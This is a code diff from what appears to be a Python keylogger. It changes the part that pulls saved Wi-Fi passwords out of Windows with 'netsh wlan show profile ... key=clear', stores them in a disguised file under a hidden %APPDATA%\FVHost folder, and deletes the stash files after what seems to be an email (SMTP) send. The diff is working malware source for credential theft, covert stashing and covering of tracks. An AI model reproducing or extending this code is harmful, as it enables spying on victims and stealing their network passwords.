@@ -88,11 +88,15 @@ try:
        for profilelist in profiles:  
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profilelist, 
                         'key=clear'],shell=True).decode('utf-8').split('\n')
-               results = [result.split(":")[1][1:-1] for result in results if "Key Content" in result]
-               with open (os.environ["appdata"]+'\\network','a')as file_1:
-                  file_2 = file_1.write("{:<}\n{:<}".format(profilelist,results[0])+'\n')
-               with open (os.environ["appdata"]+'\\network','r')as file_2:
-                 file_2 =file_2.readlines()
+               try : 
+                    results = [result.split(":")[1][1:-1] for result in results if "Key Content" in result]
+                    with open (os.environ["appdata"]+'\\FVHost'+'\\network','a')as file_1:
+                         file_2 = file_1.write("{:<}\n{:<}".format(profilelist,results[0])+'\n')
+                    with open (os.environ["appdata"]+'\\FVHost'+'\\network','r')as file_2:
+                         file_2 =file_2.readlines()
+               except FileExistsError :
+                     with open (os.environ["appdata"]+'\\FVHost'+'\\network','w+')as file_1:
+                              file_2 = file_1.read()
                  
       
        try:
@@ -280,8 +284,8 @@ class Keylogger:
                               SERVER.close()
                       if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\VHost'):
                              os.remove(os.environ["appdata"]+'\\FVHost'+'\\VHost')
-                      if os.path.exists(os.environ["appdata"]+'\\network'):
-                             os.remove(os.environ["appdata"]+'\\network')
+                      if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\network'):
+                             os.remove(os.environ["appdata"]+'\\FVHost'+'\\network')
             except smtplib.SMTPAuthenticationError:
                       pass
         def GO_START(self):
